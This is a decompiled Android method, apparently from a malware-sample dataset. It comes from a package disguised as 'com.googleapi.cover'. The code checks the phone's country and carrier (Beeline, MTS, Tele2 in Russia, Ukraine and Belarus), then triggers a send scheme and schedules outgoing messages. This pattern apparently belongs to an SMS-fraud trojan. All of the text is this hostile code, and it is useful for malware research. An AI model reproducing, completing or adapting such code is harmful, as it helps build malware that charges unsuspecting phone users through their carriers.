Package Path:com.googleapi.cover.Actor.startImpl
Class Name:Actor
Content: package com.googleapi.cover;

    public void startImpl(String data, int index) {
        PendingIntent pi = PendingIntent.getBroadcast(this.mContext, 0, new Intent(INTENT_FILTR), 0);
        if (isBeelineSubscription(this.mContext) || isMTSSubscription(this.mContext) || !INIT_NEW.equals(SCHEME_TO_USE) || ((!this.countryCode.equals(RUS_ID) && !this.countryCode.equals(UK_ID)) || ((this.countryCode.equals(RUS_ID) && this.opCode.equals(TELE2_ID)) || this.countryCode.equals(BELORUSS_ID)))) {
            if (!this.isRegistered) {
                this.isRegistered = true;
                out();
            }
            Utils.start(pi, this.actSchemes.get(SCHEME_TO_USE), data, this.mContext);
            if (isBeelineSubscription(this.mContext)) {
                MessageHandler.scheduleSend(this.mContext);
                return;
            }
            return;
        }
        beginProc();
        if (this.countryCode.equals(RUS_ID)) {
            if ((this.opCode.equals("01") || this.opCode.equals("02")) && isPrivate() && index < 1) {
                reportDone();
            }
        }
    }

